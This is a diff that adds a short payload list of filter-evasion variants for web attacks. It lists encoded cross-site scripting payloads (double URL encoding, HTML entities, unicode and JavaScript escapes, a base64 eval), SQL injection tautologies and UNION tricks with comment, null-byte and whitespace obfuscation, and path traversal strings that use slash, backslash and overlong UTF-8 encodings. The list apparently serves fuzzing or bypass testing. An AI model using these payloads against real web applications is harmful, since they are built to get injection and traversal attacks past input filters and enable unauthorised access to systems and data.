@@ -1,0 +1,36 @@
+# URL → HTML
+%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
+# HTML decimal entities
+&#60;script&#62;alert&#40;1&#41;&#60;&#47;script&#62;
+# HTML hex entities
+&#x3c;script&#x3e;alert&#x28;1&#x29;&#x3c;&#x2f;script&#x3e;
+# Unicode escapes
+\u003cscript\u003ealert(1)\u003c/script\u003e
+# JS escapes
+\x3cscript\x3ealert(1)\x3c/script\x3e
+# Base64 + eval
+eval(atob('YWxlcnQoMSk='))
+# Double URL
+%252527%2520OR%25201%253D1
+# Mixed case + comment
+/**/uNiOn/**/SeLeCt/**/
+# Null byte
+%00' OR 1=1-- -%00
+# Whitespace variants
+%09%09OR%09%091=1
+%0a%0aOR%0a%0a1=1
+%0d%0dOR%0d%0d1=1
+# Slash variants
+/%2e%2e/
+/%252e%252e/
+/..%2f
+/..%5c
+# Backslash
+\.\.\
+\..\/.\..\/
+# Charset tricks
+%c0%ae%c0%ae/
+%c1%9c..%c1%9c/
+# Overlong UTF-8
+%c0%80
+%c1%80
